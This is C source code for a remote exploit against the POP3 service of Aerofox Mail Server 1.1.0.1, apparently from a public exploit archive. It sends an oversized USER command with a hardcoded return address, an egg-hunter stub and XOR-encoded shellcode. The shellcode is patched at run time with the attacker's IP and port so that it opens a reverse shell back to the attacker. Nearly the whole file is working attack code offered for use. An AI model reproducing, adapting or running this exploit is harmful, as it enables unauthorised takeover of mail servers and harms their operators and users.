#Code by Swan(swan@0x557.org)
#include <winsock.h>
#include <windows.h>
#include <stdio.h>
#include <conio.h>

#pragma comment (lib,"ws2_32")

#define PORT_OFFSET  118
#define IP_OFFSET    111

char Shellcode[] =      "\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
                                        "\xEB\x05\xE8\xEB\xFF\xFF\xFF"
                                        "\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
                                        "\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3\x9D\xC0\x71\x02\x99\x99\x99"
                                        "\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE\xEA\xAB\xC6\xCD\x66\x8F\x12"
                                        "\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99\x7B\x60\x18\x75\x09\x98\x99"
                                        "\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF\x89\xC9\xC9\xC9\xC9\xD9\xC9"
                                        "\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6\x99\x99\x98\xF1\x9B\x99\x99"
                                        "\xAC\x12\x55\xF3\x89\xC8\xCA\x66\xCF\x81\x1C\x59\xEC\xD3\xF1\xFA"
                                        "\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD\x14\xA5\xBD\xF3\x8C\xC0\x32"
                                        "\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD\xBD\xA4\x10\xC5\xBD\xD1\x10"
                                        "\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD\xBD\x89\xCD\xC9\xC8\xC8\xC8"
                                        "\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66\xCF\x9D\x12\x55\xF3\x66\x66"
                                        "\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66\xCF\x95\xC8\xCF\x12\xDC\xA5"
                                        "\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB\xB9\x9A\x6C\xAA\x50\xD0\xD8"
                                        "\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3\x4F\xED\x91\x58\x52\x94\x9A"
                                        "\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3\x12\xC3\xBD\x9A\x44\xFF\x12"
                                        "\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D\x12\x9A\x5C\x32\xC7\xC0\x5A"
                                        "\x71\x99\x66\x66\x66\x17\xD7\x97\x75\xEB\x67\x2A\x8F\x34\x40\x9C"
                                        "\x57\xE7\x41\x7B\xEA\x52\x74\x65\xA2\x40\x90\x6C\x34\x75\x60\x33"
                                        "\xF9\x7E\xE0\x5F\xE0";

char szUser[]   =       "user 1231231231231234567890abcdefghijklmnopqrstuvwxyz1234567890a"
                                        "bcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz123"
                                        "4567890abcdefghijklmnopqrstuvwxyz1234567890abcdefghijkklmnopqrst"
                                        "uvwxyz1234567890abcdefghijkklmnopqrstuvwxyz1234567890abcdAAAAijk"
                                        "lmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz1234567890abc"
                                        "defghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz12345"
                                        "67890abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvw"
                                        "xyz1234567890abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmno"
                                        "pqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz1234567890abcdefg"
                                        "hijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz123456789"
                                        "0abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz1"
                                        "234567890abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrs"
                                        "tuvwxyz1234567890abcdefghijklmnopqrstuvwxyz1234567890abcdefghijk"
                                        "lmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz1234567890abc"
                                        "defghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz12345"
                                        "67890abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvw"
                                        "xyz1234567890abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmno"
                                        "pqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz1234567890abcdefg"
                                        "hijklmnopqrstuvwxyz\r\n";
unsigned char szPass[] = "pass siglos\r\n";



void help(char *program)
{
        printf ("========================================================\r\n");
        printf ("Aerofox Mail Server 1.1.0.1 POP3 Temp Dir Stack Overflow\r\n");
        printf ("========================================================\r\n\r\n");
        printf ("Usage: %s <Host> <Your IP> <Your port>\r\n", program);
        printf ("e.g.:\r\n");
        printf ("     %s 127.0.0.1 202.119.9.42 8111\r\n", program);
        printf ("\r\n  The ret address is 0x7ffa1571.\r\n");
        exit(0);
}

SOCKET Connect(char *u_host ,unsigned short u_port)
{
        WSADATA wsaData;
        SOCKET sock;
        struct hostent *r;
        struct sockaddr_in r_addr;
        int timeout = 1000;

        if(WSAStartup(0x0101,&wsaData) != 0)
        {
                printf("error starting winsock..");
                return -1;
        }
        if((r=gethostbyname(u_host))== NULL)
        {
                return -1 ;
        }
        if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))== INVALID_SOCKET)
        {
                return -1 ;
        }
        r_addr.sin_family=AF_INET;
        r_addr.sin_port=htons(u_port);
        r_addr.sin_addr=*((struct in_addr*)r->h_addr);

        if(connect(sock,(struct sockaddr *)&r_addr,sizeof(r_addr))==SOCKET_ERROR)
        {
                printf("Can't connect\n");
                exit(-1);
        }
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout,sizeof(timeout));
        return(sock);
}

void Disconnect(SOCKET s)
{
        closesocket(s);
        WSACleanup();
}

void tr(SOCKET s)
{
        char buff[1500];
        memset(buff, 0, sizeof(buff));
        recv(s, buff, sizeof(buff), 0);
        printf("%s\r\n",buff);
}

void SlowSend(SOCKET s, char *buf, int p)
{
        //send(s, buf, sizeof(buf),0);
        //send(s, "\r\n", 2,0);
        for(unsigned int i = 0; i < strlen(buf); i++)
        {
                Sleep(p);
                printf("%c", buf[i]);
                send(s, (char*)&(buf[i]), 1, 0);
        }
}

void main(int argc, char *argv[])
{
        /*_asm{
                mov             eax,90909091h
                dec             eax
        a:      dec             ebx
                cmp             [ebx], eax
                jnz             a
                push    ebx
                ret
        }*/
        if(argc != 4)
                help(argv[0]);

        unsigned short    port;
    unsigned long     ip;

    port = htons(atoi(argv[3]))^(USHORT)0x9999;
    ip = inet_addr(argv[2])^(ULONG)0x99999999;
    memcpy(&Shellcode[PORT_OFFSET], &port, 2);
    memcpy(&Shellcode[IP_OFFSET], &ip, 4);

        SOCKET s = Connect(argv[1], 110);
        tr(s);
        memcpy(szUser + 244, "\xCC\x90\xEB\x04\x71\x15\xFA\x7F", 8);
        memcpy(szUser + 244 + 8,  "\xB8\x91\x90\x90\x90\x48\x4B\x39\x03\x75\xFB\x53\xC3\x90\x90\x90\x90", 17);
        memcpy(szUser + 244 + 8 + 17, Shellcode, sizeof(Shellcode) - 1);

        SlowSend(s, (char*)szUser, 1);
        getch();
        tr(s);
        SlowSend(s, (char*)szPass, 100);
        tr(s);
        Disconnect(s);
        return;
}

